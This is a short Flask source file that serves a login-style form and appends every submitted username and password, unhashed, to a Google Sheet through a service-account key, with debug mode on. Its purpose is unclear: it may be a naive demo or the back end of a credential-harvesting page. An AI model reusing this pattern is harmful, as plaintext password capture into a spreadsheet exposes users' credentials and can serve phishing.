from flask import Flask, request, redirect, url_for, render_template
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import json

app = Flask(__name__)

# Load credentials from JSON key file
with open('credential.json', 'r') as f:
    credentials_json = json.load(f)

# Set up credentials and scope for Google Sheets API
scope = ['https://spreadsheets.google.com/feeds']
credentials = ServiceAccountCredentials.from_json_keyfile_dict(credentials_json, scope)

# Create a client instance for Google Sheets API
client = gspread.authorize(credentials)

# Open the spreadsheet by its ID
spreadsheet_id = 'your sheet id'
sheet = client.open_by_key(spreadsheet_id).sheet1

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        sheet.append_row([username, password])
        return redirect(url_for('index'))
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)